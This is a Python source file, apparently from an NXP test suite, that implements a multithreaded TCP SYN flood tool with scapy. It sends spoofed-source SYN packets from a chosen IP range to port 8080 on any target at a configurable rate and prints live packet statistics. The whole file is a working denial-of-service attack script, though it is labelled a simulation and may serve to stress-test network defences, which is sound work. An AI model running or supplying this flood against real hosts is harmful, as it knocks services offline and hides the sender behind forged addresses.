#!/usr/bin/env python3
# Copyright 2026 NXP
# SPDX-License-Identifier: BSD-3-Clause

import argparse
import ipaddress
import random
import signal
import sys
import time
import threading

from scapy.all import IP, TCP, send, conf

conf.verb = 0

packets_sent = 0
start_time = 0
running = True
lock = threading.Lock()


def signal_handler(signum, frame):
    global running
    running = False


def send_syn_packets(target_ip, src_ips, src_ports, rate, thread_id):
    global packets_sent, running

    interval = 1.0 / rate if rate > 0 else 0

    while running:
        src_ip = random.choice(src_ips)
        src_port = random.choice(src_ports)

        pkt = IP(src=str(src_ip), dst=target_ip) / TCP(sport=src_port, dport=8080, flags='S')

        try:
            send(pkt, verbose=False)
            with lock:
                packets_sent += 1
        except Exception as e:
            print(e)

        if interval > 0:
            time.sleep(interval)


def stats_printer():
    global packets_sent, running, start_time

    last_count = 0
    while running:
        time.sleep(1)
        with lock:
            current = packets_sent
        elapsed = time.time() - start_time
        pps = (current - last_count)
        last_count = current
        print(f"[Stats] Packets sent: {current} | Rate: {pps} pps | Elapsed: {elapsed:.1f}s")


def main():
    global start_time

    parser = argparse.ArgumentParser(description='TCP SYN Flood Attack Simulation')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--src-start', required=True, help='Source IP range start')
    parser.add_argument('--src-end', required=True, help='Source IP range end')
    parser.add_argument('--rate', type=int, default=1000, help='Packets per second (default: 1000)')
    parser.add_argument('--interface', default=None, help='Network interface to use')
    parser.add_argument('--port-start', type=int, default=10240, help='Source port range start (default: 1024)')
    parser.add_argument('--port-end', type=int, default=65535, help='Source port range end (default: 65535)')
    parser.add_argument('--threads', type=int, default=10, help='Number of sending threads (default: 10)')

    args = parser.parse_args()

    target_ip = args.target
    src_start = ipaddress.ip_address(args.src_start)
    src_end = ipaddress.ip_address(args.src_end)

    if src_start > src_end:
        sys.stderr.write('Error: src-start must be <= src-end\n')
        sys.exit(1)

    src_ips = [str(ipaddress.ip_address(ip)) for ip in range(int(src_start), int(src_end) + 1)]
    src_ports = list(range(args.port_start, args.port_end + 1))

    print(f'Target: {target_ip}')
    print(f'Source IP range: {args.src_start} - {args.src_end} ({len(src_ips)} IPs)')
    print(f'Source port range: {args.port_start} - {args.port_end} ({len(src_ports)} ports)')
    print(f'Rate: {args.rate} pps')
    print(f'Threads: {args.threads}')
    if args.interface:
        print(f'Interface: {args.interface}')
        conf.iface = args.interface
    print('Starting SYN flood... (Ctrl+C to stop)')
    print('-' * 50)

    signal.signal(signal.SIGINT, signal_handler)

    start_time = time.time()

    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()

    threads = []
    rate_per_thread = args.rate // args.threads

    for i in range(args.threads):
        t = threading.Thread(target=send_syn_packets, args=(target_ip, src_ips, src_ports, rate_per_thread, i))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    print('-' * 50)
    print(f'Stopped. Total packets sent: {packets_sent} in {elapsed:.2f}s')


if __name__ == '__main__':
    main()